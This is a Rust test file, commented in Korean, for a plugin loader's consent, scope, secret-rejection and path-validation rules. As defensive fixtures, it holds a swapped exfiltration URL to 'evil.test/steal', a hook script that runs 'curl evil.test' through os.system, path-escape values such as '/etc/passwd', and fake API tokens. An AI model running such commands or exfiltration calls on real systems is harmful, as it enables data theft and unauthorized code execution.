//! DEV-375: 정의 적재 · scope · 동의 · 비밀값 거부.
//!
//! 여기서 지키는 것은 **"정의가 git 으로 오는 것" 과 "내 기계에서 도는 것"이
//! 갈려 있다** 는 성질이다. 그게 무너지면 pull 한 순간 남의 코드가 돈다.

use super::consent;
use super::*;
use crate::test_env::env_lock;
use serde_json::json;

fn fresh_tmp(label: &str) -> PathBuf {
    let ns = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    let p = std::env::temp_dir().join(format!("og-plug-{label}-{ns}"));
    std::fs::create_dir_all(&p).unwrap();
    p
}

/// 길드 하나와 그 안의 플러그인 정의 하나.
fn write_plugin(guild: &Path, name: &str, body: serde_json::Value) {
    let dir = plugins_dir(guild).join(name);
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(
        dir.join("plugin.json"),
        serde_json::to_string_pretty(&body).unwrap(),
    )
    .unwrap();
}

fn ai_notify(scope: &[&str]) -> serde_json::Value {
    json!({
        "name": "ai-notify",
        "on": ["quest.created", "comment.added"],
        "scope": scope,
        "action": { "post": { "url": "https://example.test/hook" } }
    })
}

// ── 적재 ────────────────────────────────────────────────

#[test]
fn no_plugins_dir_is_not_an_error() {
    let g = fresh_tmp("none");
    let l = load_for(&g, Scope::Cli);
    assert!(l.active.is_empty() && l.errors.is_empty());
    let _ = std::fs::remove_dir_all(&g);
}

#[test]
fn scope_decides_where_it_runs() {
    let _guard = env_lock();
    let home = fresh_tmp("scope-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("scope");
    write_plugin(&g, "ai-notify", ai_notify(&["gui"]));

    // GUI 에서는 동의 대상, CLI 에서는 아예 대상이 아니다.
    let gui = load_for(&g, Scope::Gui);
    assert_eq!(gui.needs_consent.len(), 1);
    assert!(gui.out_of_scope.is_empty());

    let cli = load_for(&g, Scope::Cli);
    assert!(cli.needs_consent.is_empty() && cli.active.is_empty());
    assert_eq!(cli.out_of_scope, vec!["ai-notify"]);

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

/// **동의 없이는 안 돈다.** 정의가 git 으로 왔다는 것만으로 돌면 안 된다.
#[test]
fn definition_alone_does_not_run() {
    let _guard = env_lock();
    let home = fresh_tmp("consent-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("consent");
    write_plugin(&g, "ai-notify", ai_notify(&["cli"]));

    let before = load_for(&g, Scope::Cli);
    assert!(before.active.is_empty(), "동의 전에 활성화됐다");
    assert_eq!(before.needs_consent.len(), 1);

    consent::grant(&g, &before.needs_consent[0]).unwrap();
    let after = load_for(&g, Scope::Cli);
    assert_eq!(after.active.len(), 1);
    assert!(after.needs_consent.is_empty());

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

/// **정의가 바뀌면 다시 묻는다.** 어제 동의한 것이 오늘 다른 URL 로 보내고
/// 있을 수 있다 — 이게 원문을 저장하는 이유다.
#[test]
fn changing_the_definition_revokes_consent() {
    let _guard = env_lock();
    let home = fresh_tmp("rehash-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("rehash");
    write_plugin(&g, "ai-notify", ai_notify(&["cli"]));
    let l = load_for(&g, Scope::Cli);
    consent::grant(&g, &l.needs_consent[0]).unwrap();
    assert_eq!(load_for(&g, Scope::Cli).active.len(), 1);

    // 같은 이름, 다른 목적지.
    write_plugin(
        &g,
        "ai-notify",
        json!({
            "name": "ai-notify",
            "on": ["quest.created", "comment.added"],
            "scope": ["cli"],
            "action": { "post": { "url": "https://evil.test/steal" } }
        }),
    );
    let after = load_for(&g, Scope::Cli);
    assert!(after.active.is_empty(), "URL 이 바뀌었는데 그대로 돌았다");
    assert_eq!(after.needs_consent.len(), 1);

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

#[test]
fn trusting_a_guild_skips_the_question() {
    let _guard = env_lock();
    let home = fresh_tmp("trust-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("trust");
    write_plugin(&g, "ai-notify", ai_notify(&["cli"]));
    consent::trust_guild(&g).unwrap();
    assert_eq!(load_for(&g, Scope::Cli).active.len(), 1);
    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

/// 깨진 정의 하나가 나머지를 막지 않는다.
#[test]
fn one_broken_definition_does_not_block_the_rest() {
    let _guard = env_lock();
    let home = fresh_tmp("broken-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("broken");
    std::fs::create_dir_all(plugins_dir(&g).join("broken")).unwrap();
    std::fs::write(plugins_dir(&g).join("broken/plugin.json"), "{ not json").unwrap();
    write_plugin(&g, "ai-notify", ai_notify(&["cli"]));
    consent::trust_guild(&g).unwrap();

    let l = load_for(&g, Scope::Cli);
    assert_eq!(l.active.len(), 1, "깨진 이웃 때문에 멀쩡한 것이 안 실렸다");
    assert_eq!(l.errors.len(), 1);
    assert!(l.errors[0].0 == "broken");

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

// ── 검증 ────────────────────────────────────────────────

fn def(action: Action) -> PluginDef {
    PluginDef {
        name: "p".into(),
        on: vec!["quest.created".into()],
        scope: vec![Scope::Cli],
        action,
        script: None,
    }
}

#[test]
fn scope_must_be_explicit() {
    let mut d = def(Action::Post {
        url: "https://x.test".into(),
        headers: Default::default(),
        body_env: Default::default(),
        timeout_ms: None,
    });
    d.scope.clear();
    let e = validate(&d).unwrap_err().to_string();
    assert!(e.contains("scope"), "{e}");
}

#[test]
fn empty_subscription_is_rejected() {
    let mut d = def(Action::Post {
        url: "https://x.test".into(),
        headers: Default::default(),
        body_env: Default::default(),
        timeout_ms: None,
    });
    d.on.clear();
    assert!(validate(&d).is_err());
}

/// DEV-381: **없는 phase 도 적재 때 걸린다.** 오타 난 이름은 잡으면서
/// `pre:quest.created` 는 통과시켰는데, 그건 아무 오류 없이 영원히 안 도는
/// 구독이었다 — 이 저장소가 제일 싫어하는 조용한 실패다.
#[test]
fn subscribing_to_a_phase_that_never_fires_is_caught_at_load() {
    let mut d = def(Action::Post {
        url: "https://x.test".into(),
        headers: Default::default(),
        body_env: Default::default(),
        timeout_ms: None,
    });
    // 이름은 맞지만 이 이벤트는 pre 를 안 낸다.
    d.on = vec!["pre:quest.created".into()];
    let e = validate(&d).unwrap_err().to_string();
    assert!(e.contains("pre"), "{e}");

    // 실제로 pre 를 내는 것은 통과한다.
    d.on = vec!["pre:comment.added".into(), "pre:quest.deleted".into()];
    assert!(validate(&d).is_ok());
    // 와일드카드는 하나라도 맞으면 통과한다.
    d.on = vec!["pre:*".into()];
    assert!(validate(&d).is_ok());
    d.on = vec!["pre:comment.*".into()];
    assert!(validate(&d).is_ok());
    // 아무것과도 안 맞는 pre 와일드카드는 막는다.
    d.on = vec!["pre:campaign.*".into()];
    assert!(validate(&d).is_err());
}

/// 오타 난 이벤트 이름은 **조용히 안 도는** 대신 적재 때 걸린다.
#[test]
fn unknown_event_name_is_caught_at_load() {
    let mut d = def(Action::Post {
        url: "https://x.test".into(),
        headers: Default::default(),
        body_env: Default::default(),
        timeout_ms: None,
    });
    d.on = vec!["quest.creted".into()];
    let e = validate(&d).unwrap_err().to_string();
    assert!(e.contains("quest.creted"), "{e}");
    // 와일드카드는 통과해야 한다.
    d.on = vec!["quest.*".into(), "pre:*".into()];
    assert!(validate(&d).is_ok());
}

// ── 비밀값 (admin 확정: 거부) ─────────────────────────────

fn post_with_header(k: &str, v: &str) -> PluginDef {
    let mut h = BTreeMap::new();
    h.insert(k.to_string(), v.to_string());
    def(Action::Post {
        url: "https://x.test".into(),
        headers: h,
        body_env: Default::default(),
        timeout_ms: None,
    })
}

#[test]
fn literal_api_key_in_header_is_rejected() {
    let e = validate(&post_with_header(
        "Authorization",
        "Bearer abcd1234abcd1234abcd",
    ))
    .unwrap_err()
    .to_string();
    assert!(e.contains("비밀값"), "{e}");
}

#[test]
fn env_reference_is_accepted() {
    assert!(
        validate(&post_with_header(
            "Authorization",
            "Bearer ${OPENAI_API_KEY}"
        ))
        .is_ok()
    );
    assert!(validate(&post_with_header("X-Api-Key", "${MY_KEY}")).is_ok());
}

/// 접두사가 알려진 키는 **어디에 있든** 잡는다 — URL 에 박아 넣는 경우가 흔하다.
#[test]
fn known_key_prefix_is_rejected_anywhere() {
    let d = def(Action::Post {
        url: "https://api.test/v1?key=sk-abcdef123456".into(),
        headers: Default::default(),
        body_env: Default::default(),
        timeout_ms: None,
    });
    assert!(validate(&d).is_err());
    let d2 = def(Action::Run {
        command: "curl".into(),
        args: vec!["-H".into(), "Authorization: ghp_xxxxxxxxxxxx".into()],
        timeout_ms: None,
    });
    assert!(validate(&d2).is_err());
}

/// 넓게 잡으면 멀쩡한 값이 막힌다 — 평범한 헤더는 통과해야 한다.
#[test]
fn ordinary_values_are_not_flagged() {
    assert!(validate(&post_with_header("Content-Type", "application/json")).is_ok());
    assert!(validate(&post_with_header("X-Source", "openguild")).is_ok());
    let d = def(Action::Run {
        command: "/usr/local/bin/notify".into(),
        args: vec!["--quiet".into()],
        timeout_ms: None,
    });
    assert!(validate(&d).is_ok());
}

#[test]
fn env_expansion_fails_loudly_when_unset() {
    let _guard = env_lock();
    unsafe { std::env::set_var("OG_TEST_PLUGIN_VAR", "shhh") };
    assert_eq!(
        expand_env("Bearer ${OG_TEST_PLUGIN_VAR}").unwrap(),
        "Bearer shhh"
    );
    unsafe { std::env::remove_var("OG_TEST_PLUGIN_VAR") };
    // 없는 변수를 빈 문자열로 채우면 인증 없이 요청이 나가고 원인을 못 찾는다.
    assert!(expand_env("${OG_TEST_PLUGIN_VAR}").is_err());
}

/// **`run` 은 임의 실행이다.** 동의 없이는 절대 안 실린다([[DEV-377]]).
#[test]
fn a_run_action_never_loads_without_consent() {
    let _guard = env_lock();
    let home = fresh_tmp("run-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("run");
    write_plugin(
        &g,
        "shell",
        json!({
            "name": "shell",
            "on": ["quest.created"],
            "scope": ["cli"],
            "action": { "run": { "command": "/usr/local/bin/notify", "args": ["--quiet"] } }
        }),
    );

    let before = load_for(&g, Scope::Cli);
    assert!(before.active.is_empty(), "동의 없이 임의 실행이 실렸다");
    assert_eq!(before.needs_consent.len(), 1);

    consent::grant(&g, &before.needs_consent[0]).unwrap();
    let after = load_for(&g, Scope::Cli);
    assert_eq!(after.active.len(), 1);
    assert!(matches!(after.active[0].def.action, Action::Run { .. }));

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

/// DEV-383: **이름이 겹치면 안 실린다.** 동의도 화면도 이름으로 구분하는데
/// 둘이면 어느 쪽인지 알 수 없고, 프런트의 `{#each}` 키도 이름이라 화면이
/// 통째로 깨졌다. 폴더를 복사하고 이름을 안 고치는 건 흔한 실수다.
#[test]
fn a_duplicate_plugin_name_is_rejected_not_silently_merged() {
    let _guard = env_lock();
    let home = fresh_tmp("dup-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("dup");
    // 폴더는 둘, 이름은 하나.
    write_plugin(&g, "slack", ai_notify(&["cli"]));
    write_plugin(&g, "slack-staging", ai_notify(&["cli"]));
    consent::trust_guild(&g).unwrap();

    let l = load_for(&g, Scope::Cli);
    assert_eq!(l.active.len(), 1, "겹친 이름이 둘 다 실렸다");
    assert_eq!(l.errors.len(), 1, "겹친 것을 조용히 버렸다");
    assert!(l.errors[0].1.contains("겹칩니다"), "{:?}", l.errors);

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

// ── DEV-384: 함께 배포하는 예제 ─────────────────────────

/// **예제가 안 도는 건 없느니만 못하다.**
///
/// `examples/plugins/` 는 사용자가 복사해 쓰라고 두는 것이다. 정의가 검증을 못
/// 넘거나 스크립트가 컴파일이 안 되면, 처음 써 보는 사람이 자기가 뭘 잘못했나
/// 하고 헤맨다. 실제로 적재해 본다.
#[test]
fn shipped_examples_all_load() {
    let _guard = env_lock();
    let home = fresh_tmp("examples-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let src = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../examples/plugins");
    assert!(src.is_dir(), "예제 폴더가 없다: {}", src.display());

    // 예제를 진짜 길드에 복사해 넣고 그대로 적재한다.
    let g = fresh_tmp("examples");
    let dest = plugins_dir(&g);
    std::fs::create_dir_all(&dest).unwrap();
    let mut names = Vec::new();
    for e in std::fs::read_dir(&src).unwrap().flatten() {
        if !e.path().is_dir() {
            continue;
        }
        let name = e.file_name();
        let to = dest.join(&name);
        std::fs::create_dir_all(&to).unwrap();
        for f in std::fs::read_dir(e.path()).unwrap().flatten() {
            std::fs::copy(f.path(), to.join(f.file_name())).unwrap();
        }
        names.push(name.to_string_lossy().to_string());
    }
    assert!(
        names.len() >= 3,
        "예제가 {}개뿐이다: {names:?}",
        names.len()
    );
    consent::trust_guild(&g).unwrap();

    let l = load_all(&g);
    assert!(
        l.errors.is_empty(),
        "예제가 적재에 실패했다 — 복사해 쓰는 사람은 자기 탓인 줄 안다: {:?}",
        l.errors
    );
    assert_eq!(l.active.len(), names.len(), "적재된 수가 안 맞는다");

    // 각 예제가 어느 축을 보여주는지 — 하나로 몰리면 예제 구실을 못 한다.
    let kinds: std::collections::BTreeSet<&str> =
        l.active.iter().map(|p| p.def.action.kind()).collect();
    assert!(kinds.contains("post") && kinds.contains("run"), "{kinds:?}");
    assert!(
        l.active.iter().any(|p| p.def.script.is_some()),
        "스크립트를 쓰는 예제가 없다"
    );
    assert!(
        l.active.iter().any(|p| p.def.script.is_none()),
        "스크립트 없이 도는 예제가 없다 — 그것도 되는 길이다"
    );
    assert!(
        l.active
            .iter()
            .any(|p| p.def.on.iter().any(|o| o.starts_with("pre:"))),
        "관찰 pre 를 쓰는 예제가 없다"
    );

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

// ── DEV-380: 리뷰 지적 ──────────────────────────────────

/// **`sk-` 는 영어 단어 꼬리에 흔하다.** `contains` 로 보면 `task-runner`,
/// `desk-notify`, `risk-eval` 이 전부 API 키로 걸려 적재를 거부당한다.
#[test]
fn ordinary_words_ending_in_sk_are_not_api_keys() {
    for url in [
        "https://api.test/task-runner",
        "https://risk-eval.example/hook",
        "https://example.test/disk-usage",
    ] {
        let d = def(Action::Post {
            url: url.into(),
            headers: Default::default(),
            body_env: Default::default(),
            timeout_ms: None,
        });
        assert!(validate(&d).is_ok(), "멀쩡한 URL 이 막혔다: {url}");
    }
    let d = def(Action::Run {
        command: "/usr/local/bin/desk-notify".into(),
        args: vec!["--quiet".into()],
        timeout_ms: None,
    });
    assert!(validate(&d).is_ok());

    // 진짜 키는 여전히 막힌다 — 토큰 시작이면 잡는다.
    for bad in [
        "sk-abcdef123456789",
        "https://api.test/v1?key=sk-abcdef123456",
    ] {
        let d = def(Action::Post {
            url: bad.into(),
            headers: Default::default(),
            body_env: Default::default(),
            timeout_ms: None,
        });
        assert!(validate(&d).is_err(), "진짜 키를 놓쳤다: {bad}");
    }
}

/// **신뢰는 되돌릴 수 있어야 한다.** `is_granted` 가 `trusted` 에서 단락되므로,
/// 끄는 수단이 없으면 개별 철회가 영원히 거짓말을 한다.
#[test]
fn trust_can_be_withdrawn() {
    let _guard = env_lock();
    let home = fresh_tmp("untrust-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("untrust");
    write_plugin(&g, "ai-notify", ai_notify(&["cli"]));

    consent::trust_guild(&g).unwrap();
    assert_eq!(load_for(&g, Scope::Cli).active.len(), 1);

    consent::untrust_guild(&g).unwrap();
    let after = load_for(&g, Scope::Cli);
    assert!(after.active.is_empty(), "해제했는데 계속 돈다");
    assert_eq!(after.needs_consent.len(), 1);

    // 해제해도 개별 동의는 남는다.
    consent::grant(&g, &after.needs_consent[0]).unwrap();
    consent::trust_guild(&g).unwrap();
    consent::untrust_guild(&g).unwrap();
    assert_eq!(
        load_for(&g, Scope::Cli).active.len(),
        1,
        "신뢰 해제가 개별 동의까지 지웠다"
    );

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

/// **짧은 비밀번호도 비밀이다.** 예전엔 길이 검사가 `any` 안에 있어서, 나머지가
/// 8자 이하면 `any` 가 통째로 false 가 되고 리터럴이 "환경변수 참조" 로 통과했다.
#[test]
fn a_short_literal_in_a_secret_field_is_still_rejected() {
    for bad in ["Pa55word", "s3cr3t", "abc123", "hunter2"] {
        let e = validate(&post_with_header("Authorization", bad));
        assert!(e.is_err(), "짧다고 통과했다: {bad}");
    }
    // 참조는 그대로 통과한다.
    assert!(validate(&post_with_header("Authorization", "Bearer ${TOK}")).is_ok());
    assert!(validate(&post_with_header("X-Api-Key", "${K}")).is_ok());
    // 구두점뿐인 값은 비밀이 아니다.
    assert!(validate(&post_with_header("Authorization", "  ")).is_ok());
}

/// **스크립트도 git 으로 간다.** `plugin.json` 의 리터럴은 막으면서 `.rhai`
/// 안의 리터럴을 통과시키면 앞뒤가 안 맞는다 — 게다가 본문은 환경변수 확장을
/// 안 거치므로 스크립트에 박는 것이 토큰을 싣는 유일한 길이었다.
#[test]
fn a_secret_in_the_script_blocks_the_plugin() {
    let _guard = env_lock();
    let home = fresh_tmp("scriptsecret-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("scriptsecret");
    write_plugin(&g, "ai-notify", with_script(&["cli"], "t.rhai"));
    write_script(
        &g,
        "ai-notify",
        "t.rhai",
        r#"fn payload(e) { #{ token: "xoxb-1234567890abcdef" } }"#,
    );
    consent::trust_guild(&g).unwrap();

    let l = load_for(&g, Scope::Cli);
    assert!(l.active.is_empty(), "스크립트 안의 토큰이 통과했다");
    assert_eq!(l.errors.len(), 1);
    assert!(l.errors[0].1.contains("비밀값"), "{:?}", l.errors);

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

/// **`run` 이 부르는 옆 파일도 동의 대상이다.** 폴더가 작업 디렉터리이므로
/// `hook.py` 는 git 으로 따라오는 실행되는 코드다 — 갈아끼우면 다시 물어야 한다.
#[test]
fn swapping_a_sibling_program_revokes_consent() {
    let _guard = env_lock();
    let home = fresh_tmp("sibling-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("sibling");
    write_plugin(
        &g,
        "notify",
        json!({
            "name": "notify",
            "on": ["quest.created"],
            "scope": ["cli"],
            "action": { "run": { "command": "python3", "args": ["hook.py"] } }
        }),
    );
    let hook = plugins_dir(&g).join("notify/hook.py");
    std::fs::write(&hook, "print('hello')\n").unwrap();

    let l = load_for(&g, Scope::Cli);
    consent::grant(&g, &l.needs_consent[0]).unwrap();
    assert_eq!(load_for(&g, Scope::Cli).active.len(), 1);

    // 정의는 그대로. 실행되는 코드만 바뀐다.
    std::fs::write(&hook, "import os; os.system('curl evil.test')\n").unwrap();
    let after = load_for(&g, Scope::Cli);
    assert!(
        after.active.is_empty(),
        "옆 프로그램이 바뀌었는데 그대로 돌았다"
    );
    assert_eq!(after.needs_consent.len(), 1);

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

// ── 스크립트 적재 ([[DEV-376]]) ─────────────────────────

fn with_script(scope: &[&str], rel: &str) -> serde_json::Value {
    json!({
        "name": "ai-notify",
        "on": ["quest.created"],
        "scope": scope,
        "action": { "post": { "url": "https://example.test/hook" } },
        "script": rel
    })
}

fn write_script(guild: &Path, plugin: &str, rel: &str, src: &str) {
    let p = plugins_dir(guild).join(plugin).join(rel);
    std::fs::create_dir_all(p.parent().unwrap()).unwrap();
    std::fs::write(p, src).unwrap();
}

/// 문법 오류는 **적재 때** 걸린다 — 첫 이벤트 때 걸리면 이미 늦다.
#[test]
fn a_broken_script_stops_that_plugin_at_load() {
    let _guard = env_lock();
    let home = fresh_tmp("script-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("script");
    write_plugin(&g, "ai-notify", with_script(&["cli"], "t.rhai"));
    write_script(&g, "ai-notify", "t.rhai", "fn should_send(e) { ");
    write_plugin(&g, "plain", {
        let mut v = ai_notify(&["cli"]);
        v["name"] = json!("plain");
        v
    });
    consent::trust_guild(&g).unwrap();

    let l = load_for(&g, Scope::Cli);
    assert_eq!(
        l.active.len(),
        1,
        "깨진 스크립트 때문에 멀쩡한 것이 안 실렸다"
    );
    assert_eq!(l.active[0].def.name, "plain");
    assert_eq!(l.errors.len(), 1);
    assert!(l.errors[0].1.contains("컴파일"), "{:?}", l.errors);

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

/// 스크립트 파일이 아예 없으면 그 플러그인은 안 돈다 — 판단 계층이 빠진 채로
/// 돌면 안 보낼 것을 보내게 된다.
#[test]
fn a_missing_script_stops_that_plugin() {
    let _guard = env_lock();
    let home = fresh_tmp("noscript-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("noscript");
    write_plugin(&g, "ai-notify", with_script(&["cli"], "gone.rhai"));
    consent::trust_guild(&g).unwrap();

    let l = load_for(&g, Scope::Cli);
    assert!(l.active.is_empty());
    assert_eq!(l.errors.len(), 1);

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

/// `script` 는 플러그인 폴더를 벗어날 수 없다 — 정의만으로 임의 파일을
/// 컴파일 대상으로 지정할 수 있으면 안 된다.
#[test]
fn script_path_cannot_escape_the_plugin_dir() {
    for bad in ["../../secret.rhai", "/etc/passwd"] {
        let mut d = def(Action::Post {
            url: "https://x.test".into(),
            headers: Default::default(),
            body_env: Default::default(),
            timeout_ms: None,
        });
        d.script = Some(bad.into());
        let e = validate(&d).unwrap_err().to_string();
        assert!(e.contains("상대 경로"), "{bad}: {e}");
    }
    let mut ok = def(Action::Post {
        url: "https://x.test".into(),
        headers: Default::default(),
        body_env: Default::default(),
        timeout_ms: None,
    });
    ok.script = Some("sub/transform.rhai".into());
    assert!(validate(&ok).is_ok());
}

/// **스크립트를 갈아끼우면 다시 묻는다.** `plugin.json` 은 그대로인데
/// 보내는 내용만 바뀌는 길이 있으면 동의가 헐거워진다.
#[test]
fn changing_only_the_script_revokes_consent() {
    let _guard = env_lock();
    let home = fresh_tmp("rescript-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("rescript");
    write_plugin(&g, "ai-notify", with_script(&["cli"], "t.rhai"));
    write_script(
        &g,
        "ai-notify",
        "t.rhai",
        "fn payload(e) { #{ id: e.quest.id } }",
    );

    let l = load_for(&g, Scope::Cli);
    consent::grant(&g, &l.needs_consent[0]).unwrap();
    assert_eq!(load_for(&g, Scope::Cli).active.len(), 1);

    // 정의는 그대로. 실어 보내는 내용만 통째로 바뀐다.
    write_script(&g, "ai-notify", "t.rhai", "fn payload(e) { e }");
    let after = load_for(&g, Scope::Cli);
    assert!(
        after.active.is_empty(),
        "스크립트가 바뀌었는데 그대로 돌았다"
    );
    assert_eq!(after.needs_consent.len(), 1);

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

// ── 적재 → 실행 연결 ────────────────────────────────────

#[derive(Default)]
struct Rec(std::sync::Mutex<Vec<String>>);
impl runtime::Delivery for Rec {
    fn deliver(
        &self,
        p: &Plugin,
        e: &crate::events::Event,
        _b: &serde_json::Value,
    ) -> Result<(), String> {
        self.0
            .lock()
            .unwrap()
            .push(format!("{}:{}", p.def.name, e.name));
        Ok(())
    }
}

/// 적재 결과가 **emit 의 게이트**가 된다([[DEV-374]]) — 길드를 열고
/// `install_plugins` 를 부르면 그때부터 `ops` 의 emit 이 플러그인에 닿는다.
#[tokio::test]
async fn loaded_plugin_receives_real_events() {
    let home = fresh_tmp("wire-home");
    let g = fresh_tmp("wire");
    crate::repo::seed_guild_dir(&g).unwrap();
    write_plugin(&g, "ai-notify", ai_notify(&["cli"]));

    let store = crate::Store::open(&g).await.unwrap();
    let rec = std::sync::Arc::new(Rec::default());

    // env 를 건드리는 구간만 잠근다. 동의 기록과 적재는 전부 동기라 여기서
    // 끝나고, 잠금이 아래 await 에 걸쳐 들려 있지 않는다.
    let loaded = {
        let _guard = env_lock();
        unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
        consent::trust_guild(&g).unwrap();
        let loaded = store.install_plugins(Scope::Cli, rec.clone());
        unsafe { std::env::remove_var("OPENGUILD_HOME") };
        loaded
    };
    assert_eq!(loaded.active.len(), 1);

    crate::ops::quests::create_quest(
        &store,
        crate::models::CreateQuestRequest {
            quest_type_id: 1,
            title: "훅".into(),
            description: None,
            status_slug: "open".into(),
            urgency: Some(3),
            parent_quest_id: None,
        },
    )
    .await
    .unwrap();

    // 전달은 mutation 을 기다리지 않고 떠났다 — 종료 전 유예를 준다.
    assert!(store.drain_events(std::time::Duration::from_secs(5)));
    assert_eq!(
        rec.0.lock().unwrap().as_slice(),
        ["ai-notify:quest.created"]
    );

    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

/// **아무도 안 붙으면 sink 자체를 안 꽂는다.** 그래야 `ops` 가 페이로드를
/// 만들지도 않고, 플러그인을 안 쓰는 길드가 비용을 치르지 않는다.
#[tokio::test]
async fn no_active_plugin_means_no_sink() {
    let home = fresh_tmp("nosink-home");
    let g = fresh_tmp("nosink");
    crate::repo::seed_guild_dir(&g).unwrap();
    // 정의는 있지만 이 컴포넌트의 scope 가 아니다.
    write_plugin(&g, "ai-notify", ai_notify(&["gui"]));

    let store = crate::Store::open(&g).await.unwrap();
    let loaded = {
        let _guard = env_lock();
        unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
        consent::trust_guild(&g).unwrap();
        let loaded = store.install_plugins(Scope::Cli, std::sync::Arc::new(runtime::DropDelivery));
        unsafe { std::env::remove_var("OPENGUILD_HOME") };
        loaded
    };
    assert!(loaded.active.is_empty());
    assert!(!store.events.has_sink(), "돌 게 없는데 sink 가 꽂혔다");
    assert!(
        !store.events_wanted(
            crate::events::names::QUEST_CREATED,
            crate::events::Phase::Post
        ),
        "구독자가 없는데 이벤트를 만들 참이었다"
    );

    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}
